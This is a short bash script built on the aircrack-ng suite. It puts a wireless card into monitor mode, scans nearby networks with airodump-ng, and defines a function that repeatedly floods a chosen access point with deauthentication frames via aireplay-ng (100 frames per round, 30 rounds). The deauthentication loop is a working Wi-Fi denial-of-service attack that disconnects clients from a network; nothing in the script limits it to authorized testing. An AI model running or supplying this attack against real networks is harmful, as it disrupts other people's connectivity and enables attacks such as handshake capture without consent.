#!/bin/bash

monitorStart() {	
	# Checks and kills bad processes then
	# places device in monitor mode
	sudo airmon-ng check kill
	sudo airmon-ng start wlan0
	
	# Starts wifi scanning
	while true; do
		read -r -p "Start Monitoring? [Y/N]: " ANSWER
		case $ANSWER in
			[Yy]* ) sudo airodump-ng wlan0mon; break;;
			[Nn]* ) echo "lol what are you here for?... nvm"; exit;;
			* ) echo "Only Y/N work as options.";;
		esac
	done

}

deauthNet() {
	MAC=$1

	for i in {1..30}; do
		aireplay-ng --deauth 100 -a $MAC wlan0mon
		sleep 34
	done

}

monitorStart
